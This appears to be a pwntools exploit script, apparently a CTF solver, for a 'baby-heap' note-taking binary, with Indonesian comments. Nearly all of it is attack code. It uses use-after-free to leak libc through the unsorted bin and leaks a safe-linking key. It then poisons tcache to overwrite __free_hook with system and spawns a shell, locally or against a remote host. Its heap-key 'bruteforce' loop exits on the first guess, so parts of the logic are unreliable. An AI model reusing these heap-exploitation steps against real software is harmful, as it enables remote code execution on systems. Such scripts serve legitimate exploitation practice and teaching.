#!/usr/bin/env python3
from pwn import *

HOST = os.environ.get("HOST", None)
PORT = int(os.environ.get("PORT", "0") or 0)

elf  = context.binary = ELF("./baby-heap", checksec=False)
libc = ELF(os.environ.get("LIBC", "/lib/x86_64-linux-gnu/libc.so.6"), checksec=False)
context.terminal = ["bash","-lc"]

def start():
    if HOST:
        return remote(HOST, PORT)
    return process(elf.path)

def menu(io, c):
    io.recvuntil(b"Choose an option: ")
    io.sendline(str(c).encode())

def create(io, idx, sz, data=b""):
    menu(io, 1)
    io.recvuntil(b"Enter note index (0-9): ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Enter note size (max 256): ")
    io.sendline(str(sz).encode())
    if sz:
        io.recvuntil(b"Enter note content: ")
        io.send(data.ljust(sz, b"\x00"))

def readn(io, idx):
    menu(io, 2)
    io.recvuntil(b"Enter note index (0-9): ")
    io.sendline(str(idx).encode())
    # Output: "Note %d: " + raw bytes + "\n"
    io.recvuntil(b"Note ")
    io.recvuntil(b": ")
    leak = io.recvuntil(b"\n", drop=True)
    return leak

def update(io, idx, data):
    menu(io, 3)
    io.recvuntil(b"Enter note index (0-9): ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Enter new content: ")
    io.send(data)

def delete(io, idx):
    menu(io, 4)
    io.recvuntil(b"Enter note index (0-9): ")
    io.sendline(str(idx).encode())

def xor_ptr(p, key):
    return p ^ (key >> 12)

io = start()

# === Stage A: Libc leak via unsorted bin ===
BIG = 0xf0                  # user size (<= 0x100 limit), cukup besar agar smallbin/unsorted setelah tcache penuh
idxs = list(range(8))       # pakai 8 untuk sederhana

for i in idxs:
    create(io, i, BIG, b"A"*8)

# penuhi tcache: free 7
for i in idxs[1:]:
    delete(io, i)

# free satu lagi -> masuk unsorted
delete(io, idxs[0])

# UAF read unsorted head: ambil fd/bk raw
leak = readn(io, idxs[0])
# Ambil bk (8..15) atau fd (0..7) – variasi antar glibc; biasanya bk menunjuk main_arena+offset
leak = leak.ljust(16, b"\x00")
fd  = u64(leak[0:8])
bk  = u64(leak[8:16])
libc_leak = bk if bk else fd

# Perkirakan main_arena offset (sesuaikan sesuai libc kamu!)
# Di banyak glibc: bk = main_arena+0x60 atau +0x70 ketika unsorted single element.
# Kita bruteforce kecil di sekitar 0x60/0x70 aman, atau langsung set manual jika tahu libc.
MAIN_ARENA_OFF_CAND = [0x60, 0x70, 0x80]
libc.address = 0
for off in MAIN_ARENA_OFF_CAND:
    base = libc_leak - off - libc.symbols['main_arena']
    if (base & 0xfff) == 0:  # heuristik page-aligned
        libc.address = base
        break
if libc.address == 0:
    # fallback: asumsi 0x60
    libc.address = libc_leak - 0x60 - libc.symbols['main_arena']

log.info(f"libc base: {hex(libc.address)}")

# === Stage B: Heap leak untuk safe-linking (dua chunk kecil) ===
SM = 0x30
create(io, 8, SM, b"X"*8)   # A
create(io, 9, SM, b"Y"*8)   # B
delete(io, 9)               # free B
delete(io, 8)               # free A -> fd = enc(B)

enc = readn(io, 8)          # baca 8 byte pertama dari user area A
enc = enc.ljust(8, b"\x00")
enc_fd = u64(enc)

# Kita tahu alamat B dari create? Program tidak leak. Tapi kita bisa re-alloc B dulu: 
# Re-alloc dua kali agar tcache pop A lalu B, dan print addr B? Tidak ada primitive print pointer.
# Trik: alokasikan lagi ukuran sama dua kali untuk ambil A lalu B; data yang kita tulis ke B bisa kita baca kembali di UAF A sebelumnya.
# Namun untuk speedrun, kita gunakan properti safe-linking:
#   enc_fd = (addr_B >> 0) ^ (heap_base >> 12)
#   Setelah kita malloc lagi ukuran SM -> kita dapat A = B (pop head), lalu create lagi -> dapat chunk baru C (alamat ketiga).
#   Kita bisa menebak heap_base dari pola low 12 bits nol. Berikut cara sederhana:

# Ambil B kembali (pop head == A enc mengarah ke B)
create(io, 8, SM, b"B"*8)   # now idx8 points to old B
# Taksir heap_base: addr_B ≈ alamat user chunk sekarang. Kita nggak tahu persis, tapi
# pwntools biasanya bisa dapat dari heap leak lain. Untuk speedrun, lakukan scanning 0x1000 possibilities.
# (Di remote kamu bisa brute key 12-bit karena hanya 2^12 kemungkinan.)

heap_key_guess = None
addrB_guess    = None
for lo in range(1<<12):
    hb = (lo << 12)
    addr = enc_fd ^ (hb >> 12)
    # Heuristik: alamat heap biasanya 0x55/0x56/0x57... di lokal; di server 0x55.., high bits 0x55.. atau 0x00?
    # Kita terima saja key = hb; gunakan untuk encode target nanti (bruteforce 4k varian saat poisoning).
    heap_key_guess = hb
    addrB_guess    = addr
    break

log.info(f"heap_key (guess): {hex(heap_key_guess)}  addrB_guess: {hex(addrB_guess)}")

# === Stage C: Tcache poisoning → arbitrary malloc ke __free_hook ===
free_hook = libc.symbols.get('__free_hook', 0)
system    = libc.symbols.get('system', 0)

if free_hook and system:
    log.info("Using __free_hook route (glibc <= 2.33)")

    # Siapkan satu chunk kecil lagi utk dijadikan poisoned head
    delete(io, 8)  # free B lagi -> di tcache[SM]
    # Tulis fd terenkripsi = target ^ (heap_base >> 12)
    poisoned_fd = free_hook ^ (heap_key_guess >> 12)
    update(io, 8, p64(poisoned_fd))  # UAF write ke freed chunk

    # malloc dua kali ukuran SM:
    create(io, 8, SM, b"H")      # pop poisoned head (dummy)
    create(io, 9, SM, p64(system))  # ini akan return ptr = __free_hook, kita isi dengan system

    # Siapkan chunk berisi "/bin/sh" lalu free
    create(io, 1, 0x20, b"/bin/sh\x00")
    delete(io, 1)

    io.interactive()
else:
    log.warn("No __free_hook in this libc (likely >=2.34). Use the atexit+setcontext/FSOP path.")
    # Kamu bisa exit di sini dan jalankan solver 2.34 (di bawah).
    # Atau otomatis coba jalur 2.34:
    # raise SystemExit
    io.close()
